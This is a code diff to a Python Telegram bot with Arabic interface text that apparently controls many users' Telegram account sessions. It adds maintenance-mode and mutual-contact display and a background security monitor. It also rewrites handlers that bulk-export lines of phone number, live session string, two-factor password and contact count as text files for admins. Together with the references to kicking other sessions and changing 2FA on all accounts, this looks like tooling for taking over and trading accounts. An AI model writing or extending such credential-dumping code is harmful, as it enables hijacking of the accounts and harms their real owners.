@@ -23,6 +23,7 @@ from config import (
 import database
 import user_messages
 import session_manager
+import security_monitor
 import volume_backup
 import admin_resolve
 from keyboards import (
@@ -153,6 +154,26 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
     else:
         kick_line = "⏳ طرد: محاولة فورية"
     tg_id = session["telegram_id"] or "جاري الفحص..."
+
+    # وضع الصيانة
+    maint_info = database.get_maintenance_info(session)
+    if maint_info["in_maintenance"]:
+        remaining = maint_info.get("remaining_days")
+        if remaining is not None:
+            remaining_str = f"{remaining:.1f} يوم"
+        else:
+            remaining_str = "غير محدد"
+        maint_line = f"\n🔧 <b>وضع الصيانة:</b> نعم | متبقٍّ: {remaining_str}"
+    else:
+        maint_line = ""
+
+    # جهات الاتصال المشتركة
+    mutual_cnt = database.row_get(session, "mutual_contacts")
+    total_cnt  = database.row_get(session, "contacts_count")
+    contacts_line = ""
+    if mutual_cnt is not None:
+        contacts_line = f"\n👥 جهات الاتصال المشتركة: <b>{mutual_cnt}</b> / {total_cnt or '؟'}"
+
     text = (
         f"📱 <code>{h(phone)}</code>\n"
         f"🆔 Telegram ID: <code>{tg_id}</code>\n\n"
@@ -166,6 +187,8 @@ async def _render_session_detail(callback: CallbackQuery, session, page: int = 0
         f"🔒 التأمين: {secured_stat}\n"
         f"{privacy_line}"
         f"📅 تاريخ التسجيل: {h(created_at)}"
+        f"{maint_line}"
+        f"{contacts_line}"
         + ADMIN_FOOTER
     )
     await callback.message.edit_text(
@@ -2102,146 +2125,7 @@ async def process_change_2fa_all(message: Message, state: FSMContext):
     )
 
 
-# ──────────────────────────────────────────
-# سحب الجلسات (نصي وملف)
-# ──────────────────────────────────────────
-@dp.callback_query(F.data == "export_all_txt")
-async def export_all_sessions_txt(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer()
-        return
-
-    uid = callback.from_user.id
-    sessions = await _sessions_for_admin(uid)
-    if not sessions:
-        await callback.answer("❌ لا توجد جلسات.", show_alert=True)
-        return
-
-    await callback.message.edit_text("⏳ جاري تجهيز ملف الجلسات...", parse_mode="HTML")
-
-    lines = []
-    for s in sessions:
-        ss = s["session_string"]
-        if not ss or not str(ss).strip():
-            ss = await session_manager.ensure_session_string(s["phone"])
-        if ss:
-            lines.append(f"{s['phone']}:{ss}")
-
-    if not lines:
-        await callback.message.edit_text("❌ لا توجد أكواد جلسات محفوظة لإرسالها.")
-        return
-
-    # إنشاء الملف النصي في الذاكرة
-    file_content = "\n".join(lines).encode('utf-8')
-    document = BufferedInputFile(file_content, filename="all_sessions.txt")
-
-    await callback.message.answer_document(
-        document=document,
-        caption="📥 <b>ملف جميع الجلسات (رقم:كود)</b>" + ADMIN_FOOTER,
-        parse_mode="HTML"
-    )
-
-    text = await _admin_panel_text(uid)
-    await callback.message.edit_text(
-        text,
-        reply_markup=sessions_keyboard(
-            sessions, is_super_admin=is_super_admin(uid)
-        ),
-        parse_mode="HTML",
-    )
-
-
-@dp.callback_query(F.data == "export_star_txt")
-async def export_star_sessions_txt(callback: CallbackQuery):
-    if not is_super_admin(callback.from_user.id):
-        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
-        return
-
-    sessions = await database.get_a1_only_sessions()
-    if not sessions:
-        await callback.answer("❌ لا توجد جلسات ⭐.", show_alert=True)
-        return
-
-    await callback.message.edit_text("⏳ جاري تجهيز ملف جلسات النجمة...", parse_mode="HTML")
-    lines = []
-    for s in sessions:
-        ss = s["session_string"]
-        if not ss or not str(ss).strip():
-            ss = await session_manager.ensure_session_string(s["phone"])
-        if ss:
-            lines.append(f"{s['phone']}:{ss}")
-    if not lines:
-        await callback.message.edit_text("❌ لا توجد أكواد لجلسات النجمة.")
-        return
-
-    document = BufferedInputFile(
-        "\n".join(lines).encode("utf-8"),
-        filename="star_sessions.txt",
-    )
-    await callback.message.answer_document(
-        document=document,
-        caption="⭐ <b>جلساتك الخاصة (رقم:كود)</b>" + ADMIN_FOOTER,
-        parse_mode="HTML",
-    )
-    uid = callback.from_user.id
-    all_s = await _sessions_for_admin(uid)
-    text = await _admin_panel_text(uid)
-    await callback.message.edit_text(
-        text,
-        reply_markup=sessions_keyboard(all_s, is_super_admin=True),
-        parse_mode="HTML",
-    )
-
-
-@dp.callback_query(F.data == "export_secured_txt")
-async def export_secured_sessions_txt(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        await callback.answer()
-        return
-
-    uid = callback.from_user.id
-    all_sessions = await _sessions_for_admin(uid)
-    # تصفية إضافية لضمان عدم لمس جلسات السوبر أدمن للأدمن العادي
-    is_sa = is_super_admin(uid)
-    sessions = []
-    for s in all_sessions:
-        if database.row_flag(s, "secured"):
-            if is_sa or not database.row_flag(s, "a1_only"):
-                sessions.append(s)
-    
-    if not sessions:
-        await callback.answer("❌ لا توجد جلسات مؤمّنة.", show_alert=True)
-        return
-
-    await callback.message.edit_text("⏳ جاري تجهيز ملف الجلسات المؤمّنة...", parse_mode="HTML")
-    lines = []
-    for s in sessions:
-        ss = s["session_string"]
-        if not ss or not str(ss).strip():
-            ss = await session_manager.ensure_session_string(s["phone"])
-        if ss:
-            lines.append(f"{s['phone']}:{ss}")
-    
-    if not lines:
-        await callback.message.edit_text("❌ لا توجد أكواد جلسات مؤمّنة لإرسالها.")
-        return
-
-    document = BufferedInputFile(
-        "\n".join(lines).encode("utf-8"),
-        filename="secured_sessions.txt",
-    )
-    await callback.message.answer_document(
-        document=document,
-        caption="🔒 <b>ملف الجلسات المؤمّنة (رقم:كود)</b>" + ADMIN_FOOTER,
-        parse_mode="HTML",
-    )
-    
-    text = await _admin_panel_text(uid)
-    await callback.message.edit_text(
-        text,
-        reply_markup=sessions_keyboard(all_sessions, is_super_admin=is_super_admin(uid)),
-        parse_mode="HTML",
-    )
+# [export handlers moved below with format support]
 
 
 # ──────────────────────────────────────────
@@ -3310,10 +3194,12 @@ async def _startup_session_recovery():
 async def main():
     await database.init_db()
     await user_messages.initialize_from_db()
+    security_monitor.set_notify_fn(notify_admins)
     logging.info("database: %s (volume: %s)", database.DB_PATH, database.DATA_DIR)
     session_manager.set_recovery_callback(_on_recovery_done)
     session_manager.set_admin_notify_callback(_on_admin_event)
     asyncio.ensure_future(session_watchdog())
+    asyncio.ensure_future(security_monitor.security_check_loop())
     asyncio.ensure_future(_startup_email_migration())
     
     # محاولة التشغيل مع معالجة خطأ التداخل (Conflict) الشائع في Railway
@@ -3329,6 +3215,253 @@ async def main():
             else:
                 logging.error(f"❌ خطأ غير متوقع أثناء التشغيل: {e}")
                 raise e
+
+
+# ══════════════════════════════════════════
+# صيغة السحب — اختيار الفورمات
+# ══════════════════════════════════════════
+
+@dp.callback_query(F.data.startswith("export_fmt_choose_"))
+async def export_fmt_choose_handler(callback: CallbackQuery):
+    """يُظهر شاشة اختيار صيغة السحب."""
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    source_cb = callback.data.removeprefix("export_fmt_choose_")
+    current_fmt = await database.get_export_format(uid)
+    from keyboards import export_format_keyboard
+    await callback.message.edit_text(
+        "📋 <b>اختر صيغة السحب:</b>\n\n"
+        "1️⃣  رقم:جلسة\n"
+        "2️⃣  رقم:جلسة:كلمة_التحقق\n"
+        "3️⃣  رقم:جلسة:كلمة_التحقق:جهات_مشتركة\n\n"
+        f"الصيغة الحالية: <b>{current_fmt}</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=export_format_keyboard(source_cb, current_fmt),
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("set_efmt_"))
+async def set_export_fmt_handler(callback: CallbackQuery):
+    """يحفظ الصيغة المختارة ثم يُنفّذ السحب."""
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    # بيانات: set_efmt_<fmt>_<source_cb>
+    rest = callback.data.removeprefix("set_efmt_")
+    parts = rest.split("_", 1)
+    if len(parts) != 2:
+        await callback.answer("❌ خطأ في البيانات")
+        return
+    fmt_str, source_cb = parts
+    try:
+        fmt = int(fmt_str)
+    except ValueError:
+        await callback.answer("❌ صيغة غير صالحة")
+        return
+    await database.set_export_format(uid, fmt)
+    await callback.answer(f"✅ تم حفظ الصيغة {fmt}", show_alert=False)
+    # إعادة توجيه للسحب الفعلي
+    callback.data = source_cb
+    # استدعاء مباشر لمعالج السحب
+    if source_cb == "export_all_txt_go":
+        await export_all_sessions_txt_go(callback)
+    elif source_cb == "export_secured_txt_go":
+        await export_secured_sessions_txt_go(callback)
+    elif source_cb == "export_star_txt_go":
+        await export_star_sessions_txt_go(callback)
+
+
+async def _build_export_line(s, fmt: int) -> str | None:
+    """يبني سطر جلسة واحدة حسب الصيغة المختارة."""
+    phone = s["phone"]
+    ss = s.get("session_string")
+    if not ss or not str(ss).strip():
+        ss = await session_manager.ensure_session_string(phone)
+    if not ss:
+        return None
+    if fmt == 1:
+        return f"{phone}:{ss}"
+    two_fa = s.get("two_fa") or ""
+    if fmt == 2:
+        return f"{phone}:{ss}:{two_fa}"
+    # fmt == 3
+    mutual = s.get("mutual_contacts")
+    mutual_str = str(mutual) if mutual is not None else ""
+    return f"{phone}:{ss}:{two_fa}:{mutual_str}"
+
+
+# ─── وظائف السحب الفعلية (تدعم الصيغ) ───
+
+@dp.callback_query(F.data == "export_all_txt")
+async def export_all_sessions_txt_prompt(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    current_fmt = await database.get_export_format(uid)
+    from keyboards import export_format_keyboard
+    await callback.message.edit_text(
+        "📋 <b>اختر صيغة سحب الكل:</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=export_format_keyboard("export_all_txt_go", current_fmt),
+    )
+    await callback.answer()
+
+
+async def export_all_sessions_txt_go(callback: CallbackQuery):
+    uid = callback.from_user.id
+    sessions = await _sessions_for_admin(uid)
+    if not sessions:
+        await callback.answer("❌ لا توجد جلسات.", show_alert=True)
+        return
+    fmt = await database.get_export_format(uid)
+    await callback.message.edit_text(f"⏳ جاري تجهيز ملف الجلسات (صيغة {fmt})...", parse_mode="HTML")
+    lines = []
+    for s in sessions:
+        line = await _build_export_line(s, fmt)
+        if line:
+            lines.append(line)
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد جلسات محفوظة.")
+        return
+    document = BufferedInputFile("\n".join(lines).encode("utf-8"), filename="all_sessions.txt")
+    await callback.message.answer_document(
+        document=document,
+        caption=f"📥 <b>كل الجلسات — صيغة {fmt} ({len(lines)} حساب)</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(text, reply_markup=sessions_keyboard(sessions, is_super_admin=is_super_admin(uid)), parse_mode="HTML")
+
+
+@dp.callback_query(F.data == "export_secured_txt")
+async def export_secured_sessions_txt_prompt(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    current_fmt = await database.get_export_format(uid)
+    from keyboards import export_format_keyboard
+    await callback.message.edit_text(
+        "📋 <b>اختر صيغة سحب المؤمّنة:</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=export_format_keyboard("export_secured_txt_go", current_fmt),
+    )
+    await callback.answer()
+
+
+async def export_secured_sessions_txt_go(callback: CallbackQuery):
+    uid = callback.from_user.id
+    all_sessions = await _sessions_for_admin(uid)
+    is_sa = is_super_admin(uid)
+    sessions = [s for s in all_sessions if database.row_flag(s, "secured") and (is_sa or not database.row_flag(s, "a1_only"))]
+    if not sessions:
+        await callback.answer("❌ لا توجد جلسات مؤمّنة.", show_alert=True)
+        return
+    fmt = await database.get_export_format(uid)
+    await callback.message.edit_text(f"⏳ جاري تجهيز ملف المؤمّنة (صيغة {fmt})...", parse_mode="HTML")
+    lines = []
+    for s in sessions:
+        line = await _build_export_line(s, fmt)
+        if line:
+            lines.append(line)
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد لإرسالها.")
+        return
+    document = BufferedInputFile("\n".join(lines).encode("utf-8"), filename="secured_sessions.txt")
+    await callback.message.answer_document(document=document, caption=f"🔒 <b>المؤمّنة — صيغة {fmt} ({len(lines)} حساب)</b>" + ADMIN_FOOTER, parse_mode="HTML")
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(text, reply_markup=sessions_keyboard(all_sessions, is_super_admin=is_sa), parse_mode="HTML")
+
+
+@dp.callback_query(F.data == "export_star_txt")
+async def export_star_sessions_txt_prompt(callback: CallbackQuery):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    uid = callback.from_user.id
+    current_fmt = await database.get_export_format(uid)
+    from keyboards import export_format_keyboard
+    await callback.message.edit_text(
+        "📋 <b>اختر صيغة سحب النجمة:</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=export_format_keyboard("export_star_txt_go", current_fmt),
+    )
+    await callback.answer()
+
+
+async def export_star_sessions_txt_go(callback: CallbackQuery):
+    sessions = await database.get_a1_only_sessions()
+    if not sessions:
+        await callback.answer("❌ لا توجد جلسات ⭐.", show_alert=True)
+        return
+    uid = callback.from_user.id
+    fmt = await database.get_export_format(uid)
+    await callback.message.edit_text(f"⏳ جاري تجهيز جلسات النجمة (صيغة {fmt})...", parse_mode="HTML")
+    lines = []
+    for s in sessions:
+        line = await _build_export_line(s, fmt)
+        if line:
+            lines.append(line)
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد لجلسات النجمة.")
+        return
+    document = BufferedInputFile("\n".join(lines).encode("utf-8"), filename="star_sessions.txt")
+    await callback.message.answer_document(document=document, caption=f"⭐ <b>النجمة — صيغة {fmt} ({len(lines)} حساب)</b>" + ADMIN_FOOTER, parse_mode="HTML")
+    all_s = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(text, reply_markup=sessions_keyboard(all_s, is_super_admin=True), parse_mode="HTML")
+
+
+# ── وضع الصيانة وجهات الاتصال — أزرار في تفاصيل الجلسة ──
+
+@dp.callback_query(F.data.startswith("maint_on_"))
+async def maint_on_handler(callback: CallbackQuery):
+    """تبديل وضع الصيانة — إذا الحساب في الصيانة يُخرجه، وإلا يُدخله."""
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    sid = int(callback.data.split("_")[-1])
+    session = await database.get_session_by_id(sid)
+    if not session:
+        await callback.answer("❌ الجلسة غير موجودة")
+        return
+    currently_in = database.row_flag(session, "maintenance_mode")
+    if currently_in:
+        await database.set_maintenance_mode(session["phone"], False)
+        await callback.answer("✅ تم إنهاء وضع الصيانة", show_alert=True)
+    else:
+        await database.set_maintenance_mode(session["phone"], True, days=7)
+        await callback.answer("🔧 تم وضع الحساب في الصيانة (7 أيام افتراضياً)", show_alert=True)
+    # تحديث تفاصيل الجلسة
+    session = await database.get_session_by_id(sid)
+    await _render_session_detail(callback, session)
+
+
+
+@dp.callback_query(F.data.startswith("upd_contacts_"))
+async def update_contacts_handler(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    sid = int(callback.data.split("_")[-1])
+    session = await database.get_session_by_id(sid)
+    if not session:
+        await callback.answer("❌ الجلسة غير موجودة")
+        return
+    await callback.answer("⏳ جاري تحديث جهات الاتصال...")
+    result = await session_manager.get_mutual_contacts(session["phone"])
+    if result:
+        await callback.answer(f"✅ إجمالي: {result['total']} | مشتركة: {result['mutual']}", show_alert=True)
+    else:
+        await callback.answer("❌ فشل تحديث جهات الاتصال", show_alert=True)
+    session = await database.get_session_by_id(sid)
+    await _render_session_detail(callback, session)
+
 
 if __name__ == "__main__":
     asyncio.run(main())
